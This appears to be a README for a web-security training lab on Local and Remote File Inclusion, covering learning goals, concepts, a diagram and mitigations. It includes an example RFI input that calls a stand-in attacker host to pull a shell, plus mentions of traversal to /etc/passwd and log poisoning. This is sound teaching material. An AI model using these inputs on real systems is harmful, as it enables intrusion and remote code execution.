# File Inclusion

## 📖 Introduction

Web applications frequently display dynamic content by pulling components from local server files or templates based on user parameters. However, when these application parameters blindly trust user input without sanitization, risks are exposed in plain sight.

This project explores **File Inclusion** vulnerabilities—specifically **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)**. Instead of skimming the surface, this module teaches you to think like an investigator: tracing backend execution loops, mapping file paths, bypassing bad sanitization logic, and analyzing unexpected system behaviors to turn simple parameter manipulation into professional security analysis.

---

## 🎯 Learning Objectives

By the completion of this project, the following file inclusion vectors, impacts, and mitigation paradigms are mastered without the assistance of external references:

* **LFI vs. RFI:** Distinguishing between reading local host system files (LFI) and forcing the web engine to execute third-party code hosted on an external server (RFI).
* **Path Traversal (`../../`):** Mastering how directory traversal sequences break out of restricted web directories to access highly privileged system components like `/etc/passwd` or log structures.
* **LFI to Remote Code Execution (RCE):** The exact techniques used to weaponize input by embedding malicious code into log files (Log Poisoning), session states, or PHP wrappers to secure shell execution.
* **Detection & Analysis:** Utilizing fuzzing, behavioral profiling, and syntax errors to verify input reflection within vulnerable code blocks.
* **Defensive Engineering:** Implementing structural mitigation designs using strict parameters, absolute paths, system allowlists, and hardened configuration files (such as disabling `allow_url_include` in PHP).

---

## ⚙️ Technical Requirements & Constraints

To ensure exact script execution properties across testing scopes, all automation inputs follow these strict rules:

* **Testing Infrastructure:** All automation and requests are processed via **Kali Linux**.
* **Source Code Editing:** Developed and modified using terminal-native applications (`vi`, `vim`, `emacs`).
* **The 1-Line Constraint:** Every single exploitation or retrieval automation script is **exactly one line long** (`wc -l file` outputs exactly `1`).
* **POSIX Formatting:** Every script and proof-of-concept file finishes with a precise trailing newline character (`\n`) to protect pipeline parsing.
* **Environment Scope:** All testing procedures exclusively target the isolated application framework hosted at environment **Cyber - WebSec 0x07**.

---

## 📂 Vulnerability Core Concepts

### Local File Inclusion (LFI)

Occurs when the application uses unvalidated input to construct a path for dynamic file loading. Attackers leverage path traversal strings (`../`) to slide backward up the server directory hierarchy to view configuration files or source code.

### Remote File Inclusion (RFI)

Occurs when the web application allows remote addresses to be passed into internal evaluation or include statements. This enables an attacker to supply a URL pointing to a malicious payload, forcing the web server to pull down and locally execute arbitrary commands.

```
[ Attacker ] ──( Craft Input Param: ?page=http://malicious.xyz/shell.txt )──> [ Web Server ]
                                                                                   │
                                                                       ( Downloads & Executes )
                                                                                   │
                                                                                   ▼
                                                                        [ Remote Code Execution ]

```

---

## 🛠️ Defensive Engineering (How to Mitigate)

> [!IMPORTANT]
> To properly secure applications against File Inclusion vulnerabilities, implement the following architectural constraints:
> * **Enforce Allowlists:** Avoid mapping direct filenames to user input. Map input variables to static indexing codes, allowing only pre-selected, explicit files to load.
> * **Harden Language Configurations:** If using PHP, verify your configuration profile (`php.ini`) permanently disables critical directive flags:
> ```ini
> allow_url_fopen = Off
> allow_url_include = Off
> 
> ```
> 
> 
> * **Sanitize File Paths:** Use built-in system routines to resolve absolute paths and discard structural directory parameters (e.g., stripping out forward slashes, backslashes, and periods).
> 
> 

---

## ⚠️ Disclaimer

> [!WARNING]
> This repository is developed and maintained strictly for authorized penetration testing practice, academic verification, and security research. Exploiting web targets without prior written, legal consent is entirely illegal.
